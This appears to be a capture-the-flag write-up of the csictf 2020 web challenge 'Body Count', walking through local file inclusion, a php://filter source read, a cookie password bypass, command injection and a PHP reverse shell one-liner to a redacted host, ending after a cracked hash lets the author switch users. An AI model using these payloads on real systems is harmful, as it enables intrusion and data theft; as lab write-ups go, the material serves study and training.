---
title: Body Count
date: 2020-12-29
excerpt: "'Body Count' was a challenge in the Stego category of csictf 2020"
classes: wide
categories: csictf2020
tags:
  - csictf2020
  - LFI
  - php
  - RCE
  - hash-cracking
---

![img](/assets/images/ctf/csictf2020-web-bodycount/0.png)


Loading up the site, we see file=wc.php. Any time I see something like this I always check for LFI.  

![img](/assets/images/ctf/csictf2020-web-bodycount/1.png)


`http://chall.csivit.com:30202/?file=../../../etc/passwd`



![img](/assets/images/ctf/csictf2020-web-bodycount/2.png)


So LFI is in play. Let's use the php filter wrapper and grab the source of the wc.php file.



`http://chall.csivit.com:30202/?file=php://filter/convert.base64-encode/resource=wc.php`



After decoding the b64, we can get a look at what's going on under the hood.



![img](/assets/images/ctf/csictf2020-web-bodycount/3.png)


So our cookie needs to match the PASSWORD environment variable for us to get any further.  

Fortunately, robots.txt has a neat disallow.  

![img](/assets/images/ctf/csictf2020-web-bodycount/4.png)


Using the same method that we used to get the source of wc, we can get the source of checkpass  

![img](/assets/images/ctf/csictf2020-web-bodycount/5.png)


There's the password. Let's edit our cookie so we can proceed.  

Going back to the source of wc.php, we can see the command it's running, so all we need to do is inject our own command into it.  

`'; whoami #'`



'; to escape and end the previous command, whoami- our command, # to comment out the rest of the command



![img](/assets/images/ctf/csictf2020-web-bodycount/6.png)


Command injection is in play. Let's get a reverse shell.



`'; php -r '$sock=fsockopen("REDACTED",4444);exec("/bin/sh -i <&3 >&3 2>&3");' #'`



Now that we're in, browsing around the filesystem I found this directory



![img](/assets/images/ctf/csictf2020-web-bodycount/7.png)


And inside that directory is...



![img](/assets/images/ctf/csictf2020-web-bodycount/8.png)


cracked hash = csictf



Let's switch to the ctf user and browse some of these files  

![img](/assets/images/ctf/csictf2020-web-bodycount/9.png)
